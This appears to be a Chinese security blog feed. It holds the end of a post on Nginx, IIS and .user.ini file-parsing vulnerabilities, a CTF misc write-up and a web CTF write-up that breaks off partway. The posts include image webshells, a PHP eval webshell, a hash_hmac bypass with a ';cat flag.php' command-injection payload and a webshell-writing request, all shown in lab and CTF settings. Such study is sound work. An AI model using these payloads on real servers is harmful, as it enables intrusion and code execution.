title="2、空字节代码执行漏洞"></a>2、空字节代码执行漏洞</h4><p><strong>漏洞描述</strong>：<br>Ngnix在遇到%00空字节时与后端FastCGI处理不一致，导致可以在图片中嵌入PHP代码然后通过访问xxx.jpg%00.php来执行其中的代码<br><strong>影响版本</strong>:<br>Nginx 0.5.x<br>Nginx 0.6.x<br>Nginx 0.7-0.7.65<br>Nginx 0.8-0.8.37<br><strong>测试环境</strong>：<br><a href="https://nginx.org/en/download.html" target="_blank" rel="noopener">nginx官网</a><br>由于环境比较旧，不太容易搭建，这里只阐述一下大致过程：<br>1.上传一个qwzf.jpg图片文件<br>2.访问<code>http://x.x.x.x/qwzf.jpg％00.php</code><br>3.就会将qwzf.jpg作为PHP文件进行解析<br><strong>修复方法</strong>：<br>1.升级nginx<br>2.禁止在上传文件目录下执行php文件<br>3.在nginx配置或者fcgi.conf配置添加下面内容：</p><pre><code class="bash">if ($request_filename ~* (.*)\.php) {    set $php_url $1;}if (!-e $php_url.php) {    return 403;}</code></pre><h4 id="3、nginx文件名逻辑漏洞-CVE-2013-4547"><a href="#3、nginx文件名逻辑漏洞-CVE-2013-4547" class="headerlink" title="3、nginx文件名逻辑漏洞(CVE-2013-4547)"></a>3、nginx文件名逻辑漏洞(CVE-2013-4547)</h4><p><strong>漏洞描述</strong>：<br>1.漏洞产生原因：<br>错误地解析了请求的URL,错误地获取到用户请求的文件名,导致出现权限绕过、代码执行的连带影响。<br>2.漏洞原理：<br>Nginx匹配到<code>.php</code>结尾的请求，就发送给fastcgi进行解析，常见写法：</p><pre><code class="bash">location ~ \.php$ {    include        fastcgi_params;    fastcgi_pass   127.0.0.1:9000;    fastcgi_index  index.php;    fastcgi_param  SCRIPT_FILENAME  /var/www/html$fastcgi_script_name;    fastcgi_param  DOCUMENT_ROOT /var/www/html;}</code></pre><p>（1）在关闭fix_pathinfo的情况下(即<code>cgi.fix_pathinfo=0</code>)，只有.php后缀的文件才会被发送给fastcgi解析<br>（2）存在CVE-2013-4547时，请求<code>qwzf.jpg[0x20][0x00].php</code>，这个URI可匹配到正则<code>\.php$</code>，进入到Location块；<br>（3）进入后，Nginx错误地认为请求的文件是<code>qwzf.jpg[0x20]</code>，然后设置其为SCRIPT_FILENAME的值发送给fastcgi。<br>（4）fastcgi根据SCRIPT_FILENAME的值，将<code>qwzf.jpg[0x20]</code>以php文件的形式进行解析，从而造成了解析漏洞。<br>也就是说，我们只需要上传一个空格结尾的文件，即可用PHP进行解析。<br><strong>影响版本</strong>:<br>Nginx 0.8.41-1.4.3<br>Nginx 1.5 -1.5.7<br><strong>测试环境</strong>：<br>vulhub靶场的漏洞环境<br>环境位置：<code>vulhub/nginx/CVE-2013-4547</code><br>nginx版本：<code>nginx/1.4.2</code><br><strong>开始测试</strong>：<br>上传一个jpg文件，文件名为<code>qwzf.jpg</code>，文件内容为(或者上传图片马)：</p><pre><code class="php">GIF89a&lt;?php phpinfo(); ?&gt;</code></pre><p>使用burp添加空格<br><img src="https://img-blog.csdnimg.cn/20201004210938130.png" alt="在这里插入图片描述"><br>发包，成功上传文件<br><img src="https://img-blog.csdnimg.cn/20201004205855726.png" alt="在这里插入图片描述"><br>访问<code>/uploadfiles/qwzf.jpg/.php</code>，burp抓包，添加两个空格<br><img src="https://img-blog.csdnimg.cn/20201004211306639.png" alt="在这里插入图片描述"><br>使用burp的hex功能，将第二个空格的0x20改为0x00<br><img src="https://img-blog.csdnimg.cn/2020100421141686.png" alt="在这里插入图片描述"><br>发包，成功解析。<br><img src="https://img-blog.csdnimg.cn/20201004211500466.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="0x04-IIS"><a href="#0x04-IIS" class="headerlink" title="0x04 IIS"></a>0x04 IIS</h3><p>IIS(Internet Information Services)是微软出品的灵活、安全、易于管理的Web服务器。</p><h4 id="1、IIS-5-x和IIS-6-x解析漏洞"><a href="#1、IIS-5-x和IIS-6-x解析漏洞" class="headerlink" title="1、IIS 5.x和IIS 6.x解析漏洞"></a>1、IIS 5.x和IIS 6.x解析漏洞</h4><p>使用iis5.x-6.x版本的服务器，大多为windows server 2003，网站比较古老，开发语言一般为asp；该解析漏洞也只能解析asp文件，而不能解析aspx文件。<br><strong>测试环境</strong>：<br>因为找不到相关环境，并且不想搭建，所以这里只阐述相关原理和相关知识。</p><h5 id="1-目录解析-6-0"><a href="#1-目录解析-6-0" class="headerlink" title="1.目录解析(6.0)"></a>1.目录解析(6.0)</h5><p><strong>形式</strong>：<code>http://www.xxx.com/xx.asp/xx.jpg</code><br><strong>原理</strong>: 服务器默认会把<code>.asp</code>，<code>.asa</code>目录下的文件都解析成asp文件。</p><h5 id="2-文件解析-6-0"><a href="#2-文件解析-6-0" class="headerlink" title="2.文件解析(6.0)"></a>2.文件解析(6.0)</h5><p><strong>形式</strong>：<code>http://www.xxx.com/xx.asp;.jpg</code><br><strong>原理</strong>：服务器默认不解析<code>;</code>号后面的内容，因此<code>xx.asp;.jpg</code>便被解析成asp文件。</p><h5 id="3-解析文件类型-默认解析后缀"><a href="#3-解析文件类型-默认解析后缀" class="headerlink" title="3.解析文件类型(默认解析后缀)"></a>3.解析文件类型(默认解析后缀)</h5><p>有的网站会设置黑名单上传限制 ,IIS6.0 默认的可执行文件除了asp还包含这三种 :</p><pre><code class="bash">/xx.asa/xx.cer/xx.cdx</code></pre><p>iis把asa，cdx，cer解析成asp文件的原因：这四种扩展名都是用的同一个asp.dll文件来执行。<br><strong>修复方法</strong>：<br>1.阻止创建<code>.asp</code>和<code>.asa</code>类型的文件夹<br>2.阻止上传<code>xx.asp;.jpg</code>类型的文件名<br>3.阻止上传<code>.asa</code>、<code>.cer</code>和<code>.cdx</code>后缀的文件<br>4.设置权限，限制用户创建文件夹</p><h4 id="2、IIS-7-0-7-5-CGI解析漏洞"><a href="#2、IIS-7-0-7-5-CGI解析漏洞" class="headerlink" title="2、IIS 7.0/7.5 CGI解析漏洞"></a>2、IIS 7.0/7.5 CGI解析漏洞</h4><p><strong>漏洞描述</strong>：<br>IIS7/7.5的漏洞与nginx的类似，都是由于php配置文件中，开启了<code>cgi.fix_pathinfo</code>，而这并不是nginx或者iis7/7.5本身的漏洞。<br><strong>漏洞产生的条件</strong>：<br>php.ini里的<code>cgi.cgi_pathinfo=1</code><br>IIS7在Fast-CGI运行模式下<br><strong>测试环境</strong>：<br>windows server 2008 R2（x64）<br>IIS7<br>phpStudy 2018版本<br><strong>开始测试</strong>：<br>首先在VMware安装windows server 2008 R2虚拟机(比较简单，百度搜教程即可)，然后安装IIS7和phpStudy 2018。可参考：<a href="https://blog.csdn.net/nzjdsds/article/details/96989492" target="_blank" rel="noopener">IIS7.0解析漏洞</a><br>写一个index.php文件测试环境是否能正常工作。<br><img src="https://img-blog.csdnimg.cn/20201006200738763.png" alt="在这里插入图片描述"><br>正常工作。接下来，正式开始测试<br>1.在站点根目录创建一个qwzf.jpg文件，文件内容为：</p><pre><code class="php">&lt;?php phpinfo(); ?&gt;</code></pre><p>2.配置CGI 模式<br>（1）在php.ini文件里将cgi.fix_pathinfo 取消注释并把值改为1<br><img src="https://img-blog.csdnimg.cn/20201006201314867.png" alt="在这里插入图片描述"><br>（2）更改网站的处理程序映射<br>管理工具 –&gt; IIS -&gt; WIN-5RQ4P819403 -&gt; 处理程序映射<br><img src="https://img-blog.csdnimg.cn/20201006201921135.png" alt="在这里插入图片描述"><br>3.访问<code>http://192.168.201.149/qwzf.jpg/.php</code><br><img src="https://img-blog.csdnimg.cn/20201006202443478.png" alt="在这里插入图片描述"><br>发现<code>qwzf.jpg</code>成功解析。<br><strong>常用利用方法</strong>：上传图片马</p><h3 id="0x05-user-ini"><a href="#0x05-user-ini" class="headerlink" title="0x05 .user.ini"></a>0x05 .user.ini</h3><p><strong>.user.ini 作用和配置</strong><br><code>.htaccess</code>是伪静态环境配置文件，用于lamp。<br><code>.user.ini</code>是lnmp文件，里面放的是你网站的文件夹路径地址。目的是防止跨目录访问和文件跨目录读取.</p><p>为了防止跨站，可将 <code>.user.ini</code>放在网站根目录下，内容为：<br><code>open_basedir=/项目路径/:/tmp/:/proc/</code><br>如：<code>open_basedir=/var/www/html/:/tmp/:/proc/</code><br><strong>测试代码</strong>：</p><pre><code class="php">&lt;?php //获取当前文件所在的绝对目录$dir = dirname(__FILE__);echo &quot; &lt;pre&gt;&quot;;print_r($dir);//读取根目录文件夹vim$file = scandir(&#39;/&#39;);//显示echo &quot; &lt;pre&gt;&quot;;print_r($file);?&gt;</code></pre><p>没加<code>.user.ini</code>的时候可以直接读到根目录的文件<br><img src="https://img-blog.csdnimg.cn/20201004233031380.png" alt="在这里插入图片描述"><br>加上<code>.user.ini</code>之后，就读不到根目录的文件了<br><img src="https://img-blog.csdnimg.cn/20201004235609862.png" alt="在这里插入图片描述"><br><strong>.user.ini文件利用</strong></p><blockquote><p>利用条件：<br>1.服务器脚本语言为PHP<br>2.服务器使用CGI／FastCGI模式<br>3.上传目录下要有可执行的php文件</p></blockquote><p>参考：<a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html" target="_blank" rel="noopener">user.ini文件构成的PHP后门</a><br>大师傅博客里对<code>.user.ini</code>的解释具体可以怎样理解呢？<br>我的对其总结如下：</p><blockquote><p>1.<code>php.ini</code>作为php的默认的配置文件，包括很多php配置，可分为：<code>PHP_INI_SYSTEM</code>、<code>PHP_INI_PERDIR</code>、<code>PHP_INI_ALL</code>、<code>PHP_INI_USER</code>。</p></blockquote><blockquote><p>2.模式为<code>PHP_INI_USER</code>的配置项，可在<code>ini_set()</code>函数中设置、<code>注册表</code>中设置和<code>.user.ini</code>中设置</p></blockquote><blockquote><p>3.PHP会在每个目录下扫描 INI 文件，从被执行PHP 文件所在目录一直上升到 web 根目录(<code>$_SERVER[&#39;DOCUMENT_ROOT&#39;]</code>所指定的)。若被执行PHP 文件在 web 根目录之外，则只扫描该目录。</p></blockquote><blockquote><p>4.<code>.user.ini</code>简单来说，就是一个可以由用户“自定义”的<code>php.ini</code>，可以自定义的设置是模式为<code>PHP_INI_PERDIR</code> 、 <code>PHP_INI_USER</code>的设置(实际上，除<code>PHP_INI_SYSTEM</code>外的模式都可以通过<code>.user.ini</code>来设置)。</p></blockquote><blockquote><p>5.<code>.user.ini</code>是一个能被动态加载的ini文件。也就是修改<code>.user.ini</code>后，不需要重启服务器中间件，只需要等待<code>user_ini.cache_ttl</code>所设置的时间(默认为300秒)，即可被重新加载。</p></blockquote><blockquote><p>6.php配置项<code>auto_prepend_file</code>(<code>auto_append_file</code>)，指定一个文件，自动包含在要执行的文件前(后)，类似于在文件前(后)调用了require()函数。即借助<code>.user.ini</code>文件，可让所有php文件都“自动”包含某个文件<br>(当文件调用的有exit()时该设置无效）</p></blockquote><p>可直接在<code>.user.ini</code>中设置要包含的文件(如webshell、图片马等)：</p><pre><code class="bash">auto_prepend_file=qwzf.jpg</code></pre><p><code>qwzf.jpg</code>即是可执行php文件要包含的文件。<br><strong>开始测试</strong>：<br>直接使用vulhub靶场<code>vulhub/nginx/CVE-2013-4547</code>环境，在uploadfiles目录下创建一个可执行的php文件index.php<br>（1）上传<code>.user.ini</code>文件，内容如下：</p><pre><code class="bash">GIF89aauto_prepend_file=qwzf.jpg</code></pre><p>（2）上传图片马<code>qwzf.jpg</code>，内容如下：</p><pre><code class="bash">GIF89a&lt;?php phpinfo(); ?&gt;</code></pre><p>访问<code>/uploadfiles/index.php</code>，发现qwzf.jpg被成功包含到index.php之前进行解析<br><img src="https://img-blog.csdnimg.cn/20201005004430769.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="0x06-Windows操作系统文件命名规则"><a href="#0x06-Windows操作系统文件命名规则" class="headerlink" title="0x06 Windows操作系统文件命名规则"></a>0x06 Windows操作系统文件命名规则</h3><p>Windows操作系统中，文件名不能以空格或<code>.</code>开头，也不能以空格或<code>.</code>结尾。当把一个文件命名为以空格或<code>.</code>开头或结尾时，会自动地去掉开头和结尾处的空格和<code>.</code>。利用此特性，也可能造成<strong>文件解析漏洞</strong>。</p><p>参考博客：<br><a href="https://www.smi1e.top/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">文件解析漏洞总结</a><br><a href="https://www.cnblogs.com/kagari/p/12638765.html" target="_blank" rel="noopener">CTF考点总结-文件上传/文件包含</a><br><a href="https://www.leavesongs.com/PENETRATION/apache-cve-2017-15715-vulnerability.html" target="_blank" rel="noopener">利用最新Apache解析漏洞（CVE-2017-15715）绕过上传黑名单</a><br><a href="https://www.cnblogs.com/imbrave99/p/13369549.html" target="_blank" rel="noopener">文件上传漏洞，解析漏洞总结</a><br><a href="https://blog.csdn.net/u011781521/article/details/58630742" target="_blank" rel="noopener">解析漏洞整理</a><br><a href="https://www.cnblogs.com/shellr00t/p/6426856.html" target="_blank" rel="noopener">典型漏洞归纳之解析漏洞</a><br><a href="https://www.cnblogs.com/zlgxzswjy/p/6561229.html" target="_blank" rel="noopener">服务器解析漏洞总结</a><br><a href="https://blog.csdn.net/wn314/article/details/77388289/" target="_blank" rel="noopener">文件解析漏洞总结-Nginx</a><br><a href="https://zgao.top/nginx%E9%94%99%E8%AF%AF%E9%85%8D%E7%BD%AE%E5%BC%95%E5%8F%91%E7%9A%84%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" target="_blank" rel="noopener">Nginx错误配置引发的解析漏洞复现</a><br><a href="https://www.cnblogs.com/yuzly/p/11221564.html" target="_blank" rel="noopener">nginx文件名逻辑漏洞_CVE-2013-4547漏洞复现</a><br><a href="https://blog.csdn.net/u013372487/article/details/51909766?utm_source=blogxgwz1" target="_blank" rel="noopener">nginx+php使用open_basedir限制站点目录防止跨站</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞原理 </category>
          
          <category> 解析漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Apache解析漏洞 </tag>
            
            <tag> Nginx解析漏洞 </tag>
            
            <tag> IIS解析漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>“中能融合杯”第六届工控大赛线上赛部分题总结与复现</title>
      <link href="/2020/09/14/%E2%80%9C%E4%B8%AD%E8%83%BD%E8%9E%8D%E5%90%88%E6%9D%AF%E2%80%9D%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%B7%A5%E6%8E%A7%E5%A4%A7%E8%B5%9B%E7%BA%BF%E4%B8%8A%E8%B5%9B%E9%83%A8%E5%88%86%E9%A2%98%E6%80%BB%E7%BB%93%E4%B8%8E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2020/09/14/%E2%80%9C%E4%B8%AD%E8%83%BD%E8%9E%8D%E5%90%88%E6%9D%AF%E2%80%9D%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%B7%A5%E6%8E%A7%E5%A4%A7%E8%B5%9B%E7%BA%BF%E4%B8%8A%E8%B5%9B%E9%83%A8%E5%88%86%E9%A2%98%E6%80%BB%E7%BB%93%E4%B8%8E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>“中能融合杯”第六届工控大赛线上赛已经结束，题目只有杂项题(包括工控题)和逆向题。作为一名Web狗，就只能去做杂项了，杂项题挺容易的，好多都是以前的原题。关卡4的3个题发现应该都是工控题，然而我一个都不会做，I am 太菜了。。<br>队友chumen77太强了，在最后半小时做出一道逆向题，基本保住了去线下赛的资格(前20)！</p><h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3><p><strong>考点：西门子s7协议分析</strong></p><blockquote><p>题目描述：0300002402f080320100000009000e00050501120a100100010000830000290003000101<br>请解读协议内容，并准确的拿到返回值，并关注公众号：工控安全竞赛，回复返回值即可获得flag</p></blockquote><p>查询百度，发现是西门子s7协议，并且是原题：<br><a href="https://wenku.baidu.com/view/c29ee884366baf1ffc4ffe4733687e21ae45ff5f.html" target="_blank" rel="noopener">https://wenku.baidu.com/view/c29ee884366baf1ffc4ffe4733687e21ae45ff5f.html</a><br> <img src="http://img-blog.csdnimg.cn/20200912231945849.png" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20200912231955324.png" alt="在这里插入图片描述"><br>把写入数据返回的值回复到公众号，即可得到flag<br> <img src="http://img-blog.csdnimg.cn/20200912232022206.png" alt="在这里插入图片描述"></p><h3 id="ICS-1"><a href="#ICS-1" class="headerlink" title="ICS_1"></a>ICS_1</h3><p><strong>考点：Stegsolve使用+拼二维码</strong></p><blockquote><p>题目描述：在有限的时间，拼出正确的二维码</p></blockquote><p>先下载附件，是一个gif 图片，通过观察发现是几组被切开的二维码。<br>使用Stegsolve分离出18张被切开的二维码图片<br> <img src="http://img-blog.csdnimg.cn/2020091223204840.png" alt="在这里插入图片描述"><br>在ppt里使用9张二维码碎片进行拼图，得到一张二维码，另一张是假的二维码<br> <img src="http://img-blog.csdnimg.cn/20200912232102649.png" alt="在这里插入图片描述"><br>扫描，得到flag。</p><h3 id="ICS-4"><a href="#ICS-4" class="headerlink" title="ICS_4"></a>ICS_4</h3><p><strong>考点：查看图片属性+Stegsolve使用</strong></p><blockquote><p>题目描述：隐藏颇深的flag，你一定可以找到它</p></blockquote><p>下载题目，发现是一个jpg图片。使用binwalk分析，发现里边隐藏了压缩包文件<br> <img src="http://img-blog.csdnimg.cn/2020091223222072.png" alt="在这里插入图片描述"><br>使用winRAR解压，发现压缩包带有密码。在jpg图片属性里的详细信息发现一串特殊字符<br> <img src="http://img-blog.csdnimg.cn/20200912232233897.png" alt="在这里插入图片描述"><br>很明显，可能是Base64编码，Base64解码得到<br> <img src="http://img-blog.csdnimg.cn/20200912232246640.png" alt="在这里插入图片描述"><br>这个应该就是压缩包解压密码，输入密码，解压压缩包得到elec1.jpg图片。<br>使用Stegsolve分析elec1.jpg图片，在使用File Format查看图片信息时，发现了flag<br><img src="http://img-blog.csdnimg.cn/20200912232307725.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="ICS-10"><a href="#ICS-10" class="headerlink" title="ICS_10"></a>ICS_10</h3><p><strong>考点：pdf隐藏文字</strong></p><blockquote><p>题目描述：数字取证，找出flag</p></blockquote><p>下载题目，发现是一个pdf文件，打开，发现是以前做过的原题。<br>这道题flag字符串使用了透明的字符<br> <img src="http://img-blog.csdnimg.cn/20200912232551674.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>直接复制，粘贴到一个普通文件里，即可看到flag。</p><h3 id="ICS-12"><a href="#ICS-12" class="headerlink" title="ICS_12"></a>ICS_12</h3><p><strong>考点：文件分离+佛语解密+Base家族</strong></p><blockquote><p>题目描述：一只猫的心思：你能读懂我的心思吗？</p></blockquote><p>下载题目文件，发现是一个jpg图片。看着很眼熟，是ISCC2018的原题。<br>foremost分离图片中隐藏的文件，得到一个doc文件，打开doc文件<br> <img src="http://img-blog.csdnimg.cn/20200912232715817.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>很明显，是佛曰密码，使用在线佛曰解密网站解密即可<br>佛曰解密网站：<a href="http://www.keyfc.net/bbs/tools/tudoucode.aspx" target="_blank" rel="noopener">http://www.keyfc.net/bbs/tools/tudoucode.aspx</a><br>在佛曰密码前加上<code>如是我闻：</code><br><img src="http://img-blog.csdnimg.cn/20200912232758974.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>解密结果是16进制，直接16进制转ASCII码-&gt;Base64解码-&gt;Base32解码-&gt;Base16解码-&gt;Base64解码-&gt;Base32解码-&gt;Base16解码得到flag。</p><p>其他题参考我们团队的公众号。。。</p><h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>杂项没什么新的知识，基本都是常见操作。作为一个学Web的，没发现有Web题，感受到了杂项真香！！！继续努力！</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> MISC </tag>
            
            <tag> 中能融合杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>羊城杯Web题总结与复现</title>
      <link href="/2020/09/11/%E7%BE%8A%E5%9F%8E%E6%9D%AFWeb%E9%A2%98%E6%80%BB%E7%BB%93%E4%B8%8E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2020/09/11/%E7%BE%8A%E5%9F%8E%E6%9D%AFWeb%E9%A2%98%E6%80%BB%E7%BB%93%E4%B8%8E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>总结一下羊城杯的Web题，就做出几道。发现有的题是原题改的，不过涉及到一些没有学过的知识，简单总结一下。</p><h2 id="0x01-easycon"><a href="#0x01-easycon" class="headerlink" title="0x01 easycon"></a>0x01 easycon</h2><p><strong>考点：一句话木马+base64转图片</strong><br>打开题目，发现是Apache默认页，使用扫描工具扫描一下<br><img src="http://img-blog.csdnimg.cn/20200910220054129.png" alt="在这里插入图片描述"><br>发现<code>index.php</code>，访问发现弹窗<code>eval post cmd</code>，意思很明显，就是post传入cmd参数，并且应该使用了eval()函数。所以，源码里应该有<code>&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;</code>，一句话木马，蚁剑直接连<br><img src="http://img-blog.csdnimg.cn/20200910220812922.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现上图所示的这些文件，发现<code>bbbbbbbbb.txt</code>里边的文件内容很多，并且像base64编码。<br><img src="http://img-blog.csdnimg.cn/20200910221317848.png" alt="在这里插入图片描述"><br>同时看到开头的<code>/9j/</code>，根据经验是base64编码转图片，并且头部缺少内容<code>data:image/jpg;base64,</code><br>找一个base64在线转图片的网站，加上缺少的内容，进行转换，得到带有flag的图片<br><img src="http://img-blog.csdnimg.cn/20200910221846863.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="0x02-BlackCat"><a href="#0x02-BlackCat" class="headerlink" title="0x02 BlackCat"></a>0x02 BlackCat</h2><p><strong>考点：文件分析+代码审计+弱类型+hash</strong><br>查看源代码，发现注释<code>&lt;!--都说听听歌了！--&gt;</code>。于是下载引用的音频文件<code>Hei_Mao_Jing_Chang.mp3</code>，使用winhex打开，在最后边发现<br><img src="http://img-blog.csdnimg.cn/20200910222926109.png" alt="在这里插入图片描述"><br>复制出来，得到源码：</p><pre><code class="php">//post传入Black-Cat-Sheriff和One-ear绕过判断if(empty($_POST[&#39;Black-Cat-Sheriff&#39;]) || empty($_POST[&#39;One-ear&#39;])){    die(&#39;谁！竟敢踩我一只耳的尾巴！&#39;);}$clandestine = getenv(&quot;clandestine&quot;);   //获取一个环境变量的值if(isset($_POST[&#39;White-cat-monitor&#39;]))    $clandestine = hash_hmac(&#39;sha256&#39;, $_POST[&#39;White-cat-monitor&#39;], $clandestine); //使用 HMAC 方法生成带有密钥的哈希值//PHP的类型自动转换，控制的变量只有One-ear和White-cat-monitor$hh = hash_hmac(&#39;sha256&#39;, $_POST[&#39;One-ear&#39;], $clandestine);if($hh !== $_POST[&#39;Black-Cat-Sheriff&#39;]){    die(&#39;有意瞄准，无意击发，你的梦想就是你要瞄准的目标。相信自己，你就是那颗射中靶心的子弹。&#39;);}echo exec(&quot;nc&quot;.$_POST[&#39;One-ear&#39;]);</code></pre><p>代码的大概意思：</p><blockquote><p>POST传入Black-Cat-Sheriff和One-ear，绕过第一个判断<br>POST传入White-cat-monitor，绕过第二个判断，且传入的是数组使<code>$clandestine</code>为NULL，即将下一个加密的密钥置空<br>POST传入的Black-Cat-Sheriff与加密后的One-ear相同，绕过第三个判断<br>最终执行<code>echo exec(&quot;nc&quot;.$_POST[&#39;One-ear&#39;]);</code>表示成功</p></blockquote><p>测试一下下面这两条语句：<br><strong>语句1</strong>：</p><pre><code class="php">php &gt; var_dump(hash_hmac(&#39;sha256&#39;,array(1),&#39;123&#39;));PHP Warning:  hash_hmac() expects parameter 2 to be string, array given in php shell code on line 1NULL</code></pre><p><img src="http://img-blog.csdnimg.cn/20200911001536160.png" alt="在这里插入图片描述"><br>post传入White-cat-monitor为数组，对White-cat-monitor加密后使得<code>$clandestine</code>为NULL<br><strong>语句2</strong>：</p><pre><code class="php">php &gt; var_dump(hash_hmac(&#39;sha256&#39;,&#39;;id&#39;,NULL));string(64) &quot;58dedd736c5af324a198c6c663e569df59691854d1f53d704bdbce40f1d139c1&quot;</code></pre><p>对post传入的One-ear进行加密，生成hash值。<br>审计完代码后，开始做题：<br>1、POST传入Black-Cat-Sheriff和One-ear，使Black-Cat-Sheriff与加密后的One-ear相同<br>One-ear的值为：<code>;cat flag.php</code>  (通过目录扫描扫到flag.php文件)<br>Black-Cat-Sheriff的值为：One-ear加密后的值，即：</p><pre><code class="php">php &gt; var_dump(hash_hmac(&#39;sha256&#39;,&#39;;cat flag.php&#39;,NULL));string(64) &quot;04b13fc0dff07413856e54695eb6a763878cd1934c503784fe6e24b7e8cdb1b6&quot;Black-Cat-Sheriff的值为：04b13fc0dff07413856e54695eb6a763878cd1934c503784fe6e24b7e8cdb1b6</code></pre><p>2、POST传入White-cat-monitor数组(即<code>White-cat-monitor[]=1</code>)使$clandestine为NULL<br>最终得到的payload为：</p><pre><code class="php">Black-Cat-Sheriff=04b13fc0dff07413856e54695eb6a763878cd1934c503784fe6e24b7e8cdb1b6&amp;One-ear=;cat flag.php&amp;White-cat-monitor[]=1</code></pre><p>post传入得到flag<br><img src="http://img-blog.csdnimg.cn/20200911003722996.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="0x03-easyphp"><a href="#0x03-easyphp" class="headerlink" title="0x03 easyphp"></a>0x03 easyphp</h2><p><strong>考点：.htaccess解析+命令注入+相关绕过</strong><br>打开题目，发现源码：</p><pre><code class="php"> &lt;?php    $files = scandir(&#39;./&#39;);     foreach($files as $file) {        if(is_file($file)){            if ($file !== &quot;index.php&quot;) {                unlink($file);            }        }    }    if(!isset($_GET[&#39;content&#39;]) || !isset($_GET[&#39;filename&#39;])) {        highlight_file(__FILE__);        die();    }    $content = $_GET[&#39;content&#39;];    if(stristr($content,&#39;on&#39;) || stristr($content,&#39;html&#39;) || stristr($content,&#39;type&#39;) || stristr($content,&#39;flag&#39;) || stristr($content,&#39;upload&#39;) || stristr($content,&#39;file&#39;)) {        echo &quot;Hacker&quot;;        die();    }    $filename = $_GET[&#39;filename&#39;];    if(preg_match(&quot;/[^a-z\.]/&quot;, $filename) == 1) {        echo &quot;Hacker&quot;;        die();    }    $files = scandir(&#39;./&#39;);     foreach($files as $file) {        if(is_file($file)){            if ($file !== &quot;index.php&quot;) {                unlink($file);            }        }    }    file_put_contents($filename, $content . &quot;\nHello, world&quot;);?&gt; </code></pre><p>发现是<a href="https://www.bdwms.com/?p=525" target="_blank" rel="noopener">2019XNUCA的easyphp</a>原题改的，不过少了<code>include_once(&quot;fl3g.php&quot;);</code>，其他关键部分基本没变。所以可以参考解题。<br>题目的大致意思：</p><blockquote><p>1、通过file_put_contents函数来写马<br>2、对我们可以控制的参数<code>$filename</code>和<code>$content</code>分别进行了preg_match函数和stristr函数的过滤，<br>preg_match的过滤要求是输入的文件名必须只能带有<code>[a-z\.]</code>范围的字符<br>stristr函数则是过滤了on，html，type，flag，upload和file关键字<br>3、本题环境只对index.php文件进行解析。并且开头和末尾都对当前目录下的文件进行检查，删除(unlink)除了index.php外的所有文件</p></blockquote><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>根据题目的意思<code>只解析index.php</code>，想到以下方法：<br>1、写入一句话木马到index.php<br>2、写入一个<code>.htaccess</code>让当前目录下的所有文件都能解析为php文件<br>3、写入一个<code>.user.ini</code>让index.php自动包含上我们写入的马</p><blockquote><p>第一种方法是最简单的，直接写入一句话木马<?php eval($_POST['qwzf']); ?>到index.php即可<br>第二种方法，一定需要写多次，前面写的.htaccess会被删掉；而如果是写上开头自动包含，并且包含的文件就是.user.ini，并且在.user.ini中直接写入马，那么理论上index.php在删除前就可以执行到我们写入的马。<br>第三种方法，利用<code>.user.ini</code>设置文件自动包含。这里尝试一下，没有成功。</p></blockquote><h3 id="第一种解题方法：直接写入一句话木马"><a href="#第一种解题方法：直接写入一句话木马" class="headerlink" title="第一种解题方法：直接写入一句话木马"></a>第一种解题方法：直接写入一句话木马</h3><p>直接写入一句话木马到index.php</p><pre><code class="php">?filename=index.php&amp;content=&lt;?php eval($_POST[&#39;qwzf&#39;]); 